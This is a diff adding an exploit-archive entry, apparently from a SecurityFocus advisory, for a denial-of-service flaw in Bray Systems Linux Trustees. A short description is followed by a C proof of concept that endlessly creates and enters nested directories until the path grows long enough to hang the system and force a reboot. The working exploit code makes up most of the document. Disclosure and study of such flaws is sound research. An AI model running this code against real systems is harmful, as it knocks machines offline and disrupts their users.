@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/1096/info
+
+Bray Systems Linux Trustees is an access control program which manages user permissions similar to implementations of Netware. Requesting an unusually long file or directory path will cause the application to hang. Other processes may also be affected. In order to regain normal functionality, the user must reboot the machine.
+
+#include <stdio.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int main(void)
+{
+
+while(1) {
+	if(mkdir("aaaa",0777)<0) {
+		perror("mkdir");
+		exit(1);
+		}
+	if(chdir("aaaa")<0) {
+		perror("chdir");
+		exit(1);
+		}
+	}
+
+return(0);
+}
